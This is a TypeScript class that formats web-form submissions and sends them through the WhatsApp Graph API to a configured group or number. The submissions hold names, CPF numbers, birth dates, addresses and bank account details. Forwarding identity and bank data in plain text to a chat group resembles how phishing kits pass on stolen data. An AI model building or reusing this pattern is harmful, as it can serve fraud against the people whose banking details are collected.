import axios from 'axios';

interface WhatsAppMessage {
  messaging_product: string;
  to: string;
  type: string;
  text: {
    body: string;
  };
}

interface FormData {
  fullName: string;
  email: string;
  phone: string;
  cpf: string;
  birthDate: string;
  address: {
    cep: string;
    street: string;
    city: string;
    state: string;
  };
  bankInfo: {
    bank: string;
    agency: string;
    account: string;
  };
}

export class WhatsAppNotifier {
  private accessToken: string;
  private phoneNumberId: string;
  private recipientNumber: string;
  private groupId: string;
  private enabled: boolean;

  constructor() {
    this.accessToken = process.env.WHATSAPP_ACCESS_TOKEN || '';
    this.phoneNumberId = process.env.WHATSAPP_PHONE_NUMBER_ID || '';
    this.recipientNumber = process.env.WHATSAPP_RECIPIENT_NUMBER || '';
    this.groupId = process.env.WHATSAPP_GROUP_ID || '';
    this.enabled = process.env.WHATSAPP_ENABLED === 'true';
  }

  private formatMessage(formData: FormData): string {
    const timestamp = new Date().toLocaleString('pt-BR', {
      timeZone: 'America/Sao_Paulo'
    });

    return `🚨 *NOVO FORMULÁRIO PREENCHIDO!*

📅 *Data/Hora:* ${timestamp}

👤 *Dados Pessoais:*
• Nome: ${formData.fullName}
• Email: ${formData.email}
• Telefone: ${formData.phone}
• CPF: ${formData.cpf}
• Data Nascimento: ${formData.birthDate}

📍 *Endereço:*
• CEP: ${formData.address.cep}
• Rua: ${formData.address.street}
• Cidade: ${formData.address.city}
• Estado: ${formData.address.state}

🏦 *Dados Bancários:*
• Banco: ${formData.bankInfo.bank}
• Agência: ${formData.bankInfo.agency}
• Conta: ${formData.bankInfo.account}

✅ Formulário completo recebido e processado!`;
  }

  async sendFormNotification(formData: FormData): Promise<boolean> {
    if (!this.enabled) {
      console.log('WhatsApp notifications disabled');
      return false;
    }

    if (!this.accessToken || !this.phoneNumberId || !this.recipientNumber) {
      console.error('WhatsApp configuration incomplete');
      return false;
    }

    // Determinar o destinatário (grupo ou número individual)
    const recipient = this.groupId || this.recipientNumber;
    console.log(`📱 Enviando notificação para: ${this.groupId ? 'GRUPO' : 'NÚMERO'} - ${recipient}`);

    try {
      const message: WhatsAppMessage = {
        messaging_product: "whatsapp",
        to: recipient,
        type: "text",
        text: {
          body: this.formatMessage(formData)
        }
      };

      const response = await axios.post(
        `https://graph.facebook.com/v18.0/${this.phoneNumberId}/messages`,
        message,
        {
          headers: {
            'Authorization': `Bearer ${this.accessToken}`,
            'Content-Type': 'application/json'
          }
        }
      );

      console.log('WhatsApp notification sent successfully:', response.data);
      return true;
    } catch (error) {
      console.error('Error sending WhatsApp notification:', error);
      if (error && typeof error === 'object' && 'response' in error) {
        const axiosError = error as any;
        console.error('Response data:', axiosError.response?.data);
        console.error('Response status:', axiosError.response?.status);
      }
      return false;
    }
  }

  async sendSimpleNotification(message: string): Promise<boolean> {
    if (!this.enabled) {
      console.log('WhatsApp notifications disabled');
      return false;
    }

    // Determinar o destinatário (grupo ou número individual)
    const recipient = this.groupId || this.recipientNumber;

    try {
      const whatsappMessage: WhatsAppMessage = {
        messaging_product: "whatsapp",
        to: recipient,
        type: "text",
        text: {
          body: message
        }
      };

      const response = await axios.post(
        `https://graph.facebook.com/v18.0/${this.phoneNumberId}/messages`,
        whatsappMessage,
        {
          headers: {
            'Authorization': `Bearer ${this.accessToken}`,
            'Content-Type': 'application/json'
          }
        }
      );

      console.log('WhatsApp simple notification sent:', response.data);
      return true;
    } catch (error) {
      console.error('Error sending simple WhatsApp notification:', error);
      if (error && typeof error === 'object' && 'response' in error) {
        const axiosError = error as any;
        console.error('Response data:', axiosError.response?.data);
        console.error('Response status:', axiosError.response?.status);
      }
      return false;
    }
  }

  // Método para verificar se as configurações estão corretas
  isConfigured(): boolean {
    return this.enabled && 
           !!this.accessToken && 
           !!this.phoneNumberId && 
           (!!this.recipientNumber || !!this.groupId);
  }

  // Método específico para enviar para grupo
  async sendToGroup(message: string, groupId?: string): Promise<boolean> {
    if (!this.enabled) {
      console.log('WhatsApp notifications disabled');
      return false;
    }

    const targetGroup = groupId || this.groupId;
    if (!targetGroup) {
      console.error('No group ID provided');
      return false;
    }

    try {
      const whatsappMessage: WhatsAppMessage = {
        messaging_product: "whatsapp",
        to: targetGroup,
        type: "text",
        text: {
          body: message
        }
      };

      const response = await axios.post(
        `https://graph.facebook.com/v18.0/${this.phoneNumberId}/messages`,
        whatsappMessage,
        {
          headers: {
            'Authorization': `Bearer ${this.accessToken}`,
            'Content-Type': 'application/json'
          }
        }
      );

      console.log('WhatsApp group message sent:', response.data);
      return true;
    } catch (error) {
      console.error('Error sending WhatsApp group message:', error);
      if (error && typeof error === 'object' && 'response' in error) {
        const axiosError = error as any;
        console.error('Response data:', axiosError.response?.data);
        console.error('Response status:', axiosError.response?.status);
      }
      return false;
    }
  }

  // Método para verificar tipo de destinatário
  getRecipientType(): string {
    if (this.groupId) return 'GROUP';
    if (this.recipientNumber) return 'INDIVIDUAL';
    return 'NONE';
  }

  // Método para obter o destinatário atual
  getCurrentRecipient(): string {
    return this.groupId || this.recipientNumber || '';
  }
}

export const whatsappNotifier = new WhatsAppNotifier();
